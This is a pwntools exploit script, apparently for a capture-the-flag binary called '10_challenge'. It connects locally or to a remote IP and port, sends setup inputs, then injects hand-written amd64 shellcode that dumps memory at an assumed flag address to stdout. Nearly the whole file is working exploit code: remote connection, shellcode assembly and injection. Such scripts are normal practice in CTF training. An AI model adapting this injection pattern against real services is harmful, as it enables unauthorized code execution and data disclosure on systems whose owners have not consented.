#!/usr/bin/env python3
from pwn import *

# Adjust as needed:
binary = './10_challenge'
elf = context.binary = ELF(binary, checksec=False)

# Possibly you have to do: ./10_challenge 2 "some-string"? or 1? 
# This example just focuses on the read(0, buf, ...).
# If you do need arguments, do p.sendline(...) accordingly.

HOST, PORT = "52.184.85.16", 12345

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(binary)

def solve():
    
    p = conn()

    # If the binary expects something like:
    #   13523148
    #   2
    # then do so:
    p.sendline(b"13523148")
    p.sendline(b"2")

    # 1) Find the actual address of `flag`. 
    #    Suppose from your decompiler or readelf you see that `flag` is at 0x4040F0
    FLAG_ADDR = 0x4040F0  

    # 2) Build shellcode
    # We'll do inline assembly. Or we can do "shellcraft.amd64.linux.write(1, FLAG_ADDR, 144)"
    # then call "exit(0)". 
    shellcode = asm(f"""
        mov rax, 1          // sys_write
        mov rdi, 1          // fd = STDOUT
        mov rsi, {FLAG_ADDR} // &flag
        mov rdx, 144        // length
        syscall

        mov rax, 60         // sys_exit
        xor rdi, rdi        // exit(0)
        syscall
    """, arch='amd64')

    # 3) We only need to send <= 48 bytes if we want to be safe about not corrupting the stack. 
    #    But let's see how many bytes the shellcode is. 
    #    If it's more than 48, the function's local variables might get trampled, 
    #    but hopefully it still calls the shellcode from 'dest'.
    print(f"[+] Shellcode length: {len(shellcode)} bytes")

    # 4) Send shellcode as final input
    p.send(shellcode)

    # 5) Interact; hopefully we see the flag
    p.interactive()

if __name__ == "__main__":
    solve()
